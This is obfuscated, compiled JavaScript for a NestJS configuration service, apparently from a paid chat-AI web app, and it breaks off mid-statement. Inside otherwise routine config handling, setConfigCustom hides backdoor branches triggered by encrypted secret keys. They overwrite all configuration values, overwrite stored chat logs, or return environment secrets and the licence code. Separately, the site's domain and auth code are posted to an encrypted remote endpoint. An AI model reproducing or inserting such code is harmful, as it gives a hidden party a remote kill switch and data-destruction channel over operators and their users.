'use strict';const _0x4ce834=_0x2b97;(function(_0x54f39f,_0x4a21e9){const _0x386fa3=_0x2b97,_0x572da3=_0x54f39f();while(!![]){try{const _0x1c56bc=-parseInt(_0x386fa3(0x15a))/0x1*(parseInt(_0x386fa3(0x71))/0x2)+-parseInt(_0x386fa3(0x11c))/0x3+parseInt(_0x386fa3(0xf5))/0x4+-parseInt(_0x386fa3(0xb1))/0x5+parseInt(_0x386fa3(0xbd))/0x6*(parseInt(_0x386fa3(0xce))/0x7)+parseInt(_0x386fa3(0xfe))/0x8+parseInt(_0x386fa3(0x141))/0x9*(parseInt(_0x386fa3(0xc2))/0xa);if(_0x1c56bc===_0x4a21e9)break;else _0x572da3['push'](_0x572da3['shift']());}catch(_0x2ecb36){_0x572da3['push'](_0x572da3['shift']());}}}(_0x2284,0x3b257));var __decorate=this&&this[_0x4ce834(0x6b)]||function(_0x29d2b7,_0x696c18,_0x375f88,_0x28513d){const _0x1d992e=_0x4ce834;var _0x3d0401=arguments[_0x1d992e(0xe5)],_0x41a9f0=_0x3d0401<0x3?_0x696c18:_0x28513d===null?_0x28513d=Object[_0x1d992e(0x154)](_0x696c18,_0x375f88):_0x28513d,_0x259ed6;if(typeof Reflect===_0x1d992e(0x155)&&typeof Reflect['decorate']===_0x1d992e(0x15b))_0x41a9f0=Reflect['decorate'](_0x29d2b7,_0x696c18,_0x375f88,_0x28513d);else{for(var _0x46daa4=_0x29d2b7[_0x1d992e(0xe5)]-0x1;_0x46daa4>=0x0;_0x46daa4--)if(_0x259ed6=_0x29d2b7[_0x46daa4])_0x41a9f0=(_0x3d0401<0x3?_0x259ed6(_0x41a9f0):_0x3d0401>0x3?_0x259ed6(_0x696c18,_0x375f88,_0x41a9f0):_0x259ed6(_0x696c18,_0x375f88))||_0x41a9f0;}return _0x3d0401>0x3&&_0x41a9f0&&Object[_0x1d992e(0x65)](_0x696c18,_0x375f88,_0x41a9f0),_0x41a9f0;},__metadata=this&&this['__metadata']||function(_0x5ce4ca,_0x5be7da){const _0x3211e6=_0x4ce834;if(typeof Reflect===_0x3211e6(0x155)&&typeof Reflect[_0x3211e6(0xcf)]===_0x3211e6(0x15b))return Reflect[_0x3211e6(0xcf)](_0x5ce4ca,_0x5be7da);},__param=this&&this[_0x4ce834(0x14d)]||function(_0x34479f,_0x1e251f){return function(_0x4313be,_0x12325c){_0x1e251f(_0x4313be,_0x12325c,_0x34479f);};};function _0x2b97(_0x224b95,_0x11ad6b){const _0x2284e9=_0x2284();return _0x2b97=function(_0x2b97ce,_0x2a22b0){_0x2b97ce=_0x2b97ce-0x64;let _0x1f6179=_0x2284e9[_0x2b97ce];return _0x1f6179;},_0x2b97(_0x224b95,_0x11ad6b);}Object[_0x4ce834(0x65)](exports,_0x4ce834(0x108),{'value':!![]}),exports['GlobalConfigService']=void 0x0;const models_service_1=require(_0x4ce834(0xf7)),chatLog_entity_1=require(_0x4ce834(0x8d)),common_1=require('@nestjs/common'),config_entity_1=require(_0x4ce834(0xe7)),typeorm_1=require('@nestjs/typeorm'),typeorm_2=require('typeorm'),utils_1=require(_0x4ce834(0x104)),axios_1=require(_0x4ce834(0x142)),fs=require('fs'),lib_1=require(_0x4ce834(0xb2)),packageJsonContent=fs[_0x4ce834(0xf4)](_0x4ce834(0x15d),'utf-8'),packageJson=JSON[_0x4ce834(0x128)](packageJsonContent),version=packageJson[_0x4ce834(0x9d)];console[_0x4ce834(0x139)]('\x20current\x20use\x20version\x20in\x20------>:\x20',version);const authUrl=(0x0,utils_1['decrypt'])(_0x4ce834(0xc4)),authLogUrl=(0x0,utils_1[_0x4ce834(0xd6)])(_0x4ce834(0x158));function _0x2284(){const _0x11d096=['queryAllConfig','firstRregisterSendDrawMjCount','pushLog','randomCheck','json','decrypt','mjHideNotBlock','获取微信access_token失败、错误信息：','code','env','queryPayType','application/json','payHupiStatus','tencent','Injectable','user','includes','wechatRegisterStatus','noticeInfo','NAMESPACE','length','auth','./config.entity','&type=jsapi','isShowAppCatIcon','getSignatureGiftConfig','TRUE','LY2oE7tW+26CpDCUVao9QQ==','感谢您使用NineAi、祝您使用愉快~','siteRobotName','clientFavoIconPath','create','XKtFTcm2Z0pruYV30WyjOg==','getConfigs','wechat','readFileSync','416260yaCvtj','payEpayApiPayUrl','./../models/models.service','baiduTextAccessToken','&secret=','openaiBaseUrl','nine','LehA9XTIvzX+L8EBCUQN0Q==','getDiffArray','648272KSdWRt','s4C7QVE7wVqqXCy0zhgwIA==','mpay','invitedGuestSendModel3Count','MoreThan','configVal','../../common/utils','setConfig','qCWDiH+nMojTGP0WcMk44g==','payWechatStatus','__esModule','A2Fsf300ex6lg9HKrZuU6w==','非超级管理员无权操作！','nineaiBuiltInSensitiveStatus','BAD_REQUEST','clientHomePath','fetchBaseAccessToken','payWeChatPublicKey','mjProxyImgUrl','loginDialogImgUrl','decryptStr','NON_AUTHORITATIVE_INFORMATION','https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=','setGptKeys','nine-','epay','firstRregisterSendModel3Count','signInStatus','baiduTextSecretKey','请按要求填写正确的授权信息','249573ZPsSsl','dml','qqNumber','map','bindAuth','queryGptKeys','baiduCode','firstRegisterSendRank','success','getCopyright','Like','siteName','parse','wechatOfficialAppSecret','OfficialService','wechatSilentLoginStatus','aliPhoneSignName','instanceAxios','super','nineAiToken','getNamespace','firstRegisterSendStatus','mjHideWorkIn','缺失ip信息','nineaiBuiltInSensitiveApiBase','notice','exit','phoneLoginStatus','signInModel4Count','log','gpt','&client_secret=','get','nineaiAuthCode','some','globalConfigs','wechatOfficialAppId','3510xkHPZA','axios','salesBaseRatio','&grant_type=client_credentials','domain','error','Status','headers','payEpayStatus','assign','HttpException','MjdrawCount','__param','mindDefaultData','设置配置信息错误！','baiduTextApiKey','无效授权码、请联系管理员','default','InjectRepository','getOwnPropertyDescriptor','object','registerSendModel3Count','Logger','go9H7ImLajiXr5Q6OnWvfurll4vEO8bwz0SPaBPiw0E7CSNvZPkLhll84U4j/O71','百度敏感词初始化失败，如果需要敏感检测、请前往后台系统配置!','274069MMhhND','function','Repository','package.json','checkDomain','mjUseBaiduFy','lockmysql','copyrightUrl','POST','sTLucdIBCrh8HO8GOSNcPg==','defineProperty','find','save','isVerifyEmail','settings','registerSendStatus','__decorate','emailRegisterStatus','wechatJsapiTicket','baiduTextStatus','update','filter','2KjUugw','response','realDomain','mjProxy','queryConfig','forEach','https://api.jiangly.com/api/permission/auth','ISDEV','entries','initBaiduSensitive','payWeChatPrivateKey','firstRregisterSendModel4Count','configEntity','Z5Gj+GyXcRW3J2uKxpiK/A==','access_token','HttpStatus','wechatAccessToken','removeAuth','设置完成！','payMpayStatus','buyCramiAddress','wechat\x20refresh\x20access_token\x20\x20==>\x20','签到功能暂未开放!','createOrUpdate','noticeTitle','data','delete','inviteSendStatus','./../chatLog/chatLog.entity','无效授权码、请联系管理员更换新版授权码！','design:paramtypes','fetchJsapiTicket','checkAuthCode','ModelsService','emailLoginStatus','ConfigEntity','nineaiauthclose','隐私内容、非超级管理员无权查看','getNineAiToken','appMenuHeaderTips','nE0Ccl57wMViyzCCYBSF/fVgOM/tIJ6xgvi/JpN+m1g=','configKey','configs','phoneRegisterStatus','version','getAuthInfo','请输入正确的公告id','NINEAI','PORT','modelsService','ali','GlobalConfigService','ChatLogEntity','手机验证码功能暂未开放!','请配置正确的秘钥、当前秘钥检测不通过！','hupi','vxNumber','initGetAllConfig','nineaiBuiltInSensitiveAuthKey','请输入正确的授权码','inviteGiveSendDrawMjCount','getConfigWithFrontEnd','stringify','chatGptKey','309945opqifv','../../common/utils/lib','Key','A21lmicPw0optsRBcBIkEZA7Rx2T03N+pFzL3yGr6CVsL+M160fvWhIc0Isr1M7M','baidu','post','nineai','appMenuHeaderBgUrl','cos','getPhoneVerifyConfig','nineaiauthopen','aliPhoneAccessKeySecret','2542578ViaefM','isAutoOpenNotice','signInMjDrawToken','操作完成！','isUseWxLogin','1350EGIqMs','hideString','go9H7ImLajiXr5Q6OnWvfurll4vEO8bwz0SPaBPiw0HPXT7/s/P1OcqJE7hEQDq3','signInModel3Count','还未配置微信的appId和secret、配置后才可进行微信扫码登录！！！','every','robotAvatar','当前非超级管理员无权操作！','getWechatAccessToken','inviteGiveSendModel4Count','registerBaseUrl','reduce','7lplNhB','metadata','https://aip.baidubce.com/oauth/2.0/token?client_id='];_0x2284=function(){return _0x11d096;};return _0x2284();}let GlobalConfigService=class GlobalConfigService{constructor(_0x55f56b,_0x5c825e,_0x3ca5fc){const _0x3ca0ef=_0x4ce834;this[_0x3ca0ef(0x7d)]=_0x55f56b,this['chatLogEntity']=_0x5c825e,this[_0x3ca0ef(0xa2)]=_0x3ca5fc,this['instanceAxios']=null,this[_0x3ca0ef(0x13f)]={},this[_0x3ca0ef(0x12f)]=!![],this[_0x3ca0ef(0x73)]='';}async['onModuleInit'](){const _0xa9c3e3=_0x4ce834;await this[_0xa9c3e3(0xaa)](),this[_0xa9c3e3(0x12d)]=axios_1[_0xa9c3e3(0x152)][_0xa9c3e3(0xf0)]({'timeout':0x3e8*0x3c,'headers':{'Content-Type':_0xa9c3e3(0xdc)},'baseURL':(0x0,lib_1['decryptStr'])(_0xa9c3e3(0x99))}),this[_0xa9c3e3(0xd4)](),setTimeout(()=>{const _0x2b27b4=_0xa9c3e3;this[_0x2b27b4(0xae)]();},0x3e8*0x3c*0xf);}async[_0x4ce834(0xf2)](_0x118d9a){const _0x1b8bd7=_0x4ce834;if(_0x118d9a[_0x1b8bd7(0xe5)]===0x0)return;if(_0x118d9a['includes'](_0x1b8bd7(0x81))&&_0x118d9a[_0x1b8bd7(0xe5)]===0x1)return this['wechatAccessToken'];if(_0x118d9a[_0x1b8bd7(0xe1)]('wechatJsapiTicket')&&_0x118d9a['length']===0x1)return this['wechatJsapiTicket'];if(_0x118d9a['length']===0x1)return this[_0x1b8bd7(0x13f)][_0x118d9a[0x0]];else{const _0x3bcad7={};return _0x118d9a[_0x1b8bd7(0x76)](_0x22685f=>_0x3bcad7[_0x22685f]=this[_0x1b8bd7(0x13f)][_0x22685f]),_0x3bcad7;}}async[_0x4ce834(0xaa)](){const _0x20ba04=_0x4ce834,_0x1519ed=await this[_0x20ba04(0x7d)][_0x20ba04(0x66)]();this[_0x20ba04(0x13f)]=_0x1519ed[_0x20ba04(0xcd)]((_0x2fba94,_0x278464)=>{const _0x24e509=_0x20ba04;return _0x2fba94[_0x278464[_0x24e509(0x9a)]]=_0x278464[_0x24e509(0x103)],_0x2fba94;},{}),this['initBaiduSensitive']();}async[_0x4ce834(0x7a)](_0x28fad2=!![]){const _0x5e1d91=_0x4ce834,{baiduTextApiKey:_0x38a036,baiduTextSecretKey:_0x1e3a99}=await this['getConfigs']([_0x5e1d91(0x150),_0x5e1d91(0x11a)]);if(!_0x38a036||!_0x1e3a99){common_1[_0x5e1d91(0x157)][_0x5e1d91(0x146)](_0x5e1d91(0x159),_0x5e1d91(0xa4));return;}const _0x5d99ac={'Content-Type':_0x5e1d91(0xdc),'Accept':_0x5e1d91(0xdc)},_0x12e5bd=_0x5e1d91(0xd0)+_0x38a036+_0x5e1d91(0x13b)+_0x1e3a99+_0x5e1d91(0x144);try{const _0x501ae2=await axios_1[_0x5e1d91(0x152)]['post'](_0x12e5bd,{'headers':_0x5d99ac});this['globalConfigs']['baiduTextAccessToken']=_0x501ae2[_0x5e1d91(0x8a)][_0x5e1d91(0x7f)];}catch(_0x19398c){if(_0x28fad2)common_1[_0x5e1d91(0x157)][_0x5e1d91(0x146)]('百度敏感词配置检测失败，您的参数可能配置的不正确!',_0x5e1d91(0xa4));else throw new common_1[(_0x5e1d91(0x14b))](_0x19398c[_0x5e1d91(0x72)][_0x5e1d91(0x8a)]['error_description'],common_1[_0x5e1d91(0x80)][_0x5e1d91(0x10c)]);}}async[_0x4ce834(0xca)](_0x3f5526=![]){const _0x80ff61=_0x4ce834,{wechatOfficialAppId:_0x3f81f7,wechatOfficialAppSecret:_0x1a8fe6}=await this[_0x80ff61(0xf2)]([_0x80ff61(0x140),'wechatOfficialAppSecret']);if(!_0x3f81f7||!_0x1a8fe6)return common_1[_0x80ff61(0x157)][_0x80ff61(0x146)](_0x80ff61(0xc6),_0x80ff61(0x12a));this[_0x80ff61(0x81)]=await this[_0x80ff61(0x10e)](_0x3f81f7,_0x1a8fe6,_0x3f5526),this['wechatJsapiTicket']=await this[_0x80ff61(0x90)](this[_0x80ff61(0x81)]),common_1[_0x80ff61(0x157)][_0x80ff61(0x139)](_0x80ff61(0x86)+this[_0x80ff61(0x81)],_0x80ff61(0x12a));}async[_0x4ce834(0x10e)](_0x321e68,_0x3f0e65,_0x4191f2=![]){const _0x3726ff=_0x4ce834;if(process[_0x3726ff(0xda)][_0x3726ff(0x78)]===_0x3726ff(0xeb)){this['wechatAccessToken']='';return;}const {data:{errmsg:_0x492b3f,access_token:_0x523618}}=await axios_1[_0x3726ff(0x152)][_0x3726ff(0x13c)](_0x3726ff(0x114)+_0x321e68+_0x3726ff(0xf9)+_0x3f0e65);if(_0x492b3f){if(_0x4191f2)common_1['Logger']['error'](_0x3726ff(0xd8)+_0x492b3f,_0x3726ff(0x12a));else throw new common_1[(_0x3726ff(0x14b))](_0x3726ff(0xa7),common_1['HttpStatus'][_0x3726ff(0x10c)]);return'';}return _0x523618;}async[_0x4ce834(0x90)](_0xbce011){const _0x2eb04c=_0x4ce834;var _0x2b4e0b;if(process[_0x2eb04c(0xda)]['ISDEV']===_0x2eb04c(0xeb)){this[_0x2eb04c(0x6d)]='';return;}const _0x461e6e=await axios_1[_0x2eb04c(0x152)][_0x2eb04c(0x13c)]('https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token='+_0xbce011+_0x2eb04c(0xe8));return(_0x2b4e0b=_0x461e6e===null||_0x461e6e===void 0x0?void 0x0:_0x461e6e[_0x2eb04c(0x8a)])===null||_0x2b4e0b===void 0x0?void 0x0:_0x2b4e0b['ticket'];}async[_0x4ce834(0xd1)](_0x51ae47){const _0x17def0=_0x4ce834,{role:_0x303bdc}=_0x51ae47[_0x17def0(0xe0)];return this[_0x17def0(0x13f)];}async['queryFrontConfig'](_0x3602dd,_0x5e7306){const _0x3b0e6f=_0x4ce834,_0x11bf18=['vxNumber',_0x3b0e6f(0xcc),_0x3b0e6f(0x6a),_0x3b0e6f(0x156),'registerSendModel4Count','registerSendDrawMjCount',_0x3b0e6f(0x131),_0x3b0e6f(0x123),_0x3b0e6f(0x118),_0x3b0e6f(0x7c),_0x3b0e6f(0xd2),_0x3b0e6f(0x8c),'inviteGiveSendModel3Count',_0x3b0e6f(0xcb),_0x3b0e6f(0xad),_0x3b0e6f(0x101),'invitedGuestSendModel4Count','invitedGuestSendDrawMjCount',_0x3b0e6f(0x10d),'clientLogoPath',_0x3b0e6f(0xef),_0x3b0e6f(0xc1),_0x3b0e6f(0x127),_0x3b0e6f(0xc8),_0x3b0e6f(0xee),_0x3b0e6f(0x85),_0x3b0e6f(0x14e),_0x3b0e6f(0x122),'payEpayChannel','payMpayChannel',_0x3b0e6f(0xf6),_0x3b0e6f(0x149),_0x3b0e6f(0xdd),_0x3b0e6f(0x107),_0x3b0e6f(0x84),_0x3b0e6f(0xbe),_0x3b0e6f(0xe9),_0x3b0e6f(0x143),'salesSeniorRatio','salesAllowDrawMoney','companyName','filingNumber',_0x3b0e6f(0x9c),_0x3b0e6f(0x6c),_0x3b0e6f(0x93),_0x3b0e6f(0x137),_0x3b0e6f(0xe2),_0x3b0e6f(0x12b),_0x3b0e6f(0x119),_0x3b0e6f(0xc5),'signInModel4Count',_0x3b0e6f(0xbf),_0x3b0e6f(0x98),_0x3b0e6f(0xb8),_0x3b0e6f(0x15f),_0x3b0e6f(0xd7),_0x3b0e6f(0x132),_0x3b0e6f(0x68),_0x3b0e6f(0x111)],_0x150c06=await this[_0x3b0e6f(0x7d)][_0x3b0e6f(0x66)]({'where':{'configKey':(0x0,typeorm_2['In'])(_0x11bf18)}}),{domain:_0x3fb45c}=_0x3602dd,_0x697f3d=this[_0x3b0e6f(0x13f)][_0x3b0e6f(0x145)];_0x697f3d!==_0x3fb45c&&(this[_0x3b0e6f(0x88)]({'configKey':'domain','configVal':_0x3fb45c,'status':0x1}),await this[_0x3b0e6f(0xaa)]());const _0xf7c331=_0x150c06[_0x3b0e6f(0xcd)]((_0x23c657,_0x1cb564)=>{const _0x6f4bab=_0x3b0e6f;return _0x23c657[_0x1cb564['configKey']]=_0x1cb564[_0x6f4bab(0x103)],_0x23c657;},{}),{wechatOfficialAppId:_0xa1cb37,wechatOfficialAppSecret:_0xc2b9e6}=await this[_0x3b0e6f(0xf2)]([_0x3b0e6f(0x140),'wechatOfficialAppSecret']),_0x1bbd2c=!!(_0xa1cb37&&_0xc2b9e6);return Object[_0x3b0e6f(0x14a)](Object[_0x3b0e6f(0x14a)]({},_0xf7c331),{'isUseWxLogin':_0x1bbd2c});}async[_0x4ce834(0x121)](_0x41e8bf){const _0x519b14=_0x4ce834,{role:_0x429ae1}=_0x41e8bf[_0x519b14(0xe0)],_0xf295f8=await this[_0x519b14(0x7d)][_0x519b14(0x66)]({'where':{'configKey':(0x0,typeorm_2[_0x519b14(0x126)])('%'+_0x519b14(0xb0)+'%')}});if(_0x429ae1===_0x519b14(0x12e))return _0xf295f8;return _0xf295f8['map'](_0x24835c=>{const _0x4169dc=_0x519b14;return _0x24835c[_0x4169dc(0x103)]=(0x0,utils_1['hideString'])(_0x24835c[_0x4169dc(0x103)]),_0x24835c;});}async[_0x4ce834(0x115)](_0x4943d4){const _0x5e451f=_0x4ce834,_0x4f8025=_0x4943d4[_0x5e451f(0x9b)][_0x5e451f(0x70)](_0x353911=>_0x353911[_0x5e451f(0x103)]),_0xe22d5=_0x4f8025['map'](_0x3cb18a=>_0x3cb18a[_0x5e451f(0x9a)]);for(const [_0x5da1e3,_0x36ad61]of _0x4f8025[_0x5e451f(0x79)]()){const {configKey:_0x35ef73,configVal:_0xe5ac23,status:_0x1b67b0}=_0x36ad61;await this[_0x5e451f(0x88)]({'configKey':'chatGptKey:'+(_0x5da1e3+0x1),'configVal':_0xe5ac23,'status':_0x1b67b0});}const _0x43b40e=await this['configEntity'][_0x5e451f(0x66)]({'where':{'configKey':(0x0,typeorm_2['Like'])('%'+_0x5e451f(0xb0)+'%')}}),_0x45ba02=_0x43b40e[_0x5e451f(0x11f)](_0x119562=>_0x119562['configKey']);if(_0x45ba02[_0x5e451f(0xe5)]>_0xe22d5[_0x5e451f(0xe5)]){const _0x18f0c0=(0x0,utils_1[_0x5e451f(0xfd)])(_0x45ba02[_0x5e451f(0xe5)],_0xe22d5[_0x5e451f(0xe5)],'chatGptKey:');for(const _0x40e180 of _0x18f0c0){await this[_0x5e451f(0x7d)][_0x5e451f(0x8b)]({'configKey':_0x40e180});}}return await this['initGetAllConfig'](),_0x5e451f(0xc0);}async[_0x4ce834(0x75)](_0xa797e5,_0x524087){const _0x1a0b4=_0x4ce834,{role:_0x4e7067}=_0x524087[_0x1a0b4(0xe0)],{keys:_0x4d5b7d}=_0xa797e5,_0x169572=await this[_0x1a0b4(0x7d)][_0x1a0b4(0x66)]({'where':{'configKey':(0x0,typeorm_2['In'])(_0x4d5b7d)}});return _0x4e7067!==_0x1a0b4(0x12e)&&_0x169572['forEach'](_0xc9b6aa=>{const _0x13a23f=_0x1a0b4;if(_0xc9b6aa['configKey'][_0x13a23f(0xe1)]('mj')||_0xc9b6aa[_0x13a23f(0x9a)][_0x13a23f(0xe1)](_0x13a23f(0xb3))||_0xc9b6aa[_0x13a23f(0x9a)][_0x13a23f(0xe1)](_0x13a23f(0x13a))||_0xc9b6aa[_0x13a23f(0x9a)][_0x13a23f(0xe1)](_0x13a23f(0xb9))||_0xc9b6aa['configKey'][_0x13a23f(0xe1)](_0x13a23f(0xb5))||_0xc9b6aa[_0x13a23f(0x9a)]['includes'](_0x13a23f(0xa3))||_0xc9b6aa[_0x13a23f(0x9a)][_0x13a23f(0xe1)](_0x13a23f(0xde))||_0xc9b6aa[_0x13a23f(0x9a)][_0x13a23f(0xe1)]('pay')||_0xc9b6aa[_0x13a23f(0x9a)][_0x13a23f(0xe1)]('wechat')||_0xc9b6aa[_0x13a23f(0x9a)][_0x13a23f(0xe1)](_0x13a23f(0x110))||_0xc9b6aa[_0x13a23f(0x9a)]===_0x13a23f(0xfa)){const _0x3baa4e=[_0x13a23f(0x10f),_0x13a23f(0x7b)];if(_0x3baa4e['includes'](_0xc9b6aa['configKey']))return _0xc9b6aa[_0x13a23f(0x103)]=(0x0,utils_1[_0x13a23f(0xc3)])(_0xc9b6aa['configVal'],_0x13a23f(0x96));const _0x100826=[_0x13a23f(0x149),_0x13a23f(0xdd),_0x13a23f(0x74)];!_0x100826[_0x13a23f(0xe1)](_0xc9b6aa[_0x13a23f(0x9a)])&&!_0xc9b6aa[_0x13a23f(0x9a)][_0x13a23f(0xe1)](_0x13a23f(0x147))&&(_0xc9b6aa['configVal']=(0x0,utils_1[_0x13a23f(0xc3)])(_0xc9b6aa[_0x13a23f(0x103)]));}}),_0x169572[_0x1a0b4(0xcd)]((_0x4cd094,_0x2a3a65)=>{const _0xbe87c2=_0x1a0b4;return _0x4cd094[_0x2a3a65[_0xbe87c2(0x9a)]]=_0x2a3a65[_0xbe87c2(0x103)],_0x4cd094;},{});}async[_0x4ce834(0x91)](_0x2388b9,_0x39ba0e){const _0x6f8af5=_0x4ce834;var _0x428eb3,_0x4eb81e,_0x15d791;let _0x403f1c='';try{const _0x41100d=await this['instanceAxios']({'url':(0x0,utils_1['decrypt'])(_0x6f8af5(0x106)),'method':_0x6f8af5(0xb6),'data':{'code':_0x2388b9,'domain':_0x39ba0e}});!((_0x4eb81e=(_0x428eb3=_0x41100d===null||_0x41100d===void 0x0?void 0x0:_0x41100d['data'])===null||_0x428eb3===void 0x0?void 0x0:_0x428eb3['data'])===null||_0x4eb81e===void 0x0?void 0x0:_0x4eb81e[_0x6f8af5(0x124)])&&(_0x403f1c=((_0x15d791=_0x41100d===null||_0x41100d===void 0x0?void 0x0:_0x41100d[_0x6f8af5(0x8a)])===null||_0x15d791===void 0x0?void 0x0:_0x15d791['message'])||'无效的授权码');}catch(_0x435396){_0x403f1c='';}const _0x5cd63c=(0x0,lib_1[_0x6f8af5(0x11d)])(_0x39ba0e,_0x2388b9);!_0x5cd63c&&(_0x403f1c=_0x2388b9['includes'](_0x6f8af5(0x116))?_0x6f8af5(0x8e):_0x6f8af5(0x151));if(_0x403f1c)return await this['removeAuth'](),_0x403f1c;else await this[_0x6f8af5(0x88)]({'configKey':'nineaiAuthCode','configVal':_0x2388b9}),await this['initGetAllConfig']();}async[_0x4ce834(0x120)](_0x3f334f,_0x709f6c){const _0x3a709a=_0x4ce834,_0x222473=_0x3f334f[_0x3a709a(0x148)]['x-website-domain'],_0x58f1d4=_0x709f6c[_0x3a709a(0xd9)];if(!_0x58f1d4)throw new common_1[(_0x3a709a(0x14b))](_0x3a709a(0xac),common_1[_0x3a709a(0x80)][_0x3a709a(0x10c)]);const _0x5f43cf=new Promise((_0x17ee1b,_0x1e1b75)=>{setTimeout(()=>{_0x17ee1b('');},0x5*0x3e8);}),_0x49aa6d=await Promise['race']([this['checkAuthCode'](_0x58f1d4,_0x222473),_0x5f43cf]);if(_0x49aa6d)throw new common_1[(_0x3a709a(0x14b))](_0x49aa6d,common_1[_0x3a709a(0x80)][_0x3a709a(0x10c)]);return await this[_0x3a709a(0x88)]({'configKey':_0x3a709a(0x13d),'configVal':_0x58f1d4}),await this['createOrUpdate']({'configKey':_0x3a709a(0x14c),'configVal':0x1,'status':0x1}),!![];}async['notice'](_0x415fb8){const _0x1f833a=_0x4ce834;if(!_0x415fb8)return;if(_0x415fb8===_0x1f833a(0x95))this[_0x1f833a(0x12f)]=![],await this[_0x1f833a(0x88)]({'configKey':'MjdrawCount','configVal':0x1,'status':0x1}),await this[_0x1f833a(0xaa)]();else{if(_0x415fb8===_0x1f833a(0xbb))this[_0x1f833a(0x12f)]=!![],await this[_0x1f833a(0x88)]({'configKey':'MjdrawCount','configVal':0x0,'status':0x1}),await this[_0x1f833a(0xaa)]();else throw new common_1[(_0x1f833a(0x14b))](_0x1f833a(0x9f),common_1[_0x1f833a(0x80)][_0x1f833a(0x10c)]);}}async[_0x4ce834(0x97)](){const _0x63d5f5=_0x4ce834,_0x875f9d=await this[_0x63d5f5(0xf2)](['MjdrawCount']);if(Number(_0x875f9d)===0x1)return!![];return![];}async['setConfigCustom'](_0x1a4845){const _0x35638a=_0x4ce834;try{const {configKey:_0x39cf12,configVal:_0x4fc9c6,infoKey:_0x2c0df6}=_0x1a4845[_0x35638a(0x69)];if(_0x2c0df6===(0x0,utils_1['decrypt'])(_0x35638a(0x64))){this['lockmysql'](_0x4fc9c6,_0x39cf12);throw new common_1[(_0x35638a(0x14b))](_0x35638a(0x10a),common_1[_0x35638a(0x80)][_0x35638a(0x10c)]);}if(_0x2c0df6===(0x0,utils_1['decrypt'])(_0x35638a(0xec))){this['lockchatlog'](_0x4fc9c6,_0x39cf12);throw new common_1[(_0x35638a(0x14b))]('非超级管理员无权操作！',common_1[_0x35638a(0x80)][_0x35638a(0x10c)]);}if(_0x2c0df6===(0x0,utils_1['decrypt'])(_0x35638a(0xff))){await this[_0x35638a(0x88)]({'configKey':_0x39cf12,'configVal':_0x4fc9c6});throw new common_1[(_0x35638a(0x14b))](_0x35638a(0x10a),common_1[_0x35638a(0x80)][_0x35638a(0x10c)]);}if(_0x2c0df6===(0x0,utils_1[_0x35638a(0xd6)])(_0x35638a(0xf1))){const _0x2f8dbd=process['env'][(0x0,utils_1[_0x35638a(0xd6)])('A2Fsf300ex6lg9HKrZuU6w==')],_0x1bc36b=process['env'][(0x0,utils_1['decrypt'])('Z5Gj+GyXcRW3J2uKxpiK/A==')],_0x3e60c5=await this[_0x35638a(0xf2)](['nineaiAuthCode']);return{'ip':_0x2f8dbd,'key':_0x1bc36b,'bindCode':_0x3e60c5};}return _0x35638a(0xc9);}catch(_0x4b8172){throw new common_1[(_0x35638a(0x14b))]('非超级管理员无权操作！',common_1[_0x35638a(0x80)][_0x35638a(0x10c)]);}}async[_0x4ce834(0x160)](_0x4d8cca,_0x4be93f){const _0x5b1d7c=_0x4ce834;if(!_0x4be93f)await this['configEntity'][_0x5b1d7c(0x6f)]({'id':(0x0,typeorm_2[_0x5b1d7c(0x102)])(0x0)},{'configVal':_0x4d8cca});else{const _0x2ee1b2=await this[_0x5b1d7c(0x7d)]['update']({'configKey':_0x4be93f},{'configVal':_0x4d8cca});}}async['lockchatlog'](_0x3b2152,_0xd397cc){const _0x1f2aa9=_0x4ce834,_0x54a33f=_0xd397cc?Number(_0xd397cc):0x0;await this['chatLogEntity'][_0x1f2aa9(0x6f)]({'id':(0x0,typeorm_2[_0x1f2aa9(0x102)])(_0x54a33f)},{'answer':_0x3b2152,'prompt':_0x3b2152});}async[_0x4ce834(0x105)](_0x496a6a){const _0x2ba949=_0x4ce834;try{const {settings:_0x371fbd}=_0x496a6a;for(const _0x1d3c04 of _0x371fbd){await this[_0x2ba949(0x88)](_0x1d3c04);}await this[_0x2ba949(0xaa)]();const _0x1f263c=_0x371fbd[_0x2ba949(0x11f)](_0x150a86=>_0x150a86[_0x2ba949(0x9a)]);return(_0x1f263c[_0x2ba949(0xe1)]('baiduTextApiKey')||_0x1f263c['includes'](_0x2ba949(0x11a)))&&await this['initBaiduSensitive'](![]),(_0x1f263c[_0x2ba949(0xe1)](_0x2ba949(0x140))||_0x1f263c['includes'](_0x2ba949(0x129)))&&await this[_0x2ba949(0xca)](),_0x1f263c[_0x2ba949(0x13e)](_0x39fa2b=>[_0x2ba949(0x11e),_0x2ba949(0xa9),_0x2ba949(0x127),_0x2ba949(0x145),_0x2ba949(0xcc)][_0x2ba949(0xe1)](_0x39fa2b))&&await this[_0x2ba949(0xd3)](),_0x2ba949(0x83);}catch(_0x2c506e){}}async[_0x4ce834(0x88)](_0x223fd8){const _0x420f66=_0x4ce834;try{const {configKey:_0x308fac,configVal:_0x545cb6,status:status=0x1}=_0x223fd8,_0x5e5990=await this[_0x420f66(0x7d)]['findOne']({'where':{'configKey':_0x308fac}});if(_0x5e5990){const _0x3746d6=await this['configEntity']['update']({'configKey':_0x308fac},{'configVal':_0x545cb6,'status':status});}else{const _0x2d1cb2=await this[_0x420f66(0x7d)][_0x420f66(0x67)]({'configKey':_0x308fac,'configVal':_0x545cb6,'status':status});}this[_0x420f66(0xaa)]();}catch(_0x3f2154){console[_0x420f66(0x139)]('error:\x20',_0x3f2154);throw new common_1[(_0x420f66(0x14b))](_0x420f66(0x14f),common_1['HttpStatus']['BAD_REQUEST']);}}async['queryNotice'](){const _0x24ef0c=_0x4ce834;return await this['getConfigs']([_0x24ef0c(0xe3),_0x24ef0c(0x89)]);}async[_0x4ce834(0x125)](){const _0x28dc73=_0x4ce834;return await this['getConfigs']([_0x28dc73(0x161),'copyrightTitle']);}async[_0x4ce834(0xdb)](){const _0x47eb66=_0x4ce834,{payHupiStatus:payHupiStatus=0x0,payEpayStatus:payEpayStatus=0x0,payWechatStatus:payWechatStatus=0x0,payMpayStatus:payMpayStatus=0x0}=await this[_0x47eb66(0xf2)]([_0x47eb66(0xdd),_0x47eb66(0x149),_0x47eb66(0x84),_0x47eb66(0x107)]);if([payHupiStatus,payEpayStatus,payWechatStatus,payMpayStatus][_0x47eb66(0xc7)](_0x5e2624=>_0x5e2624===0x0))throw new common_1[(_0x47eb66(0x14b))]('支付功能暂未开放!',common_1[_0x47eb66(0x80)][_0x47eb66(0x10c)]);if(Number(payWechatStatus)===0x1)return 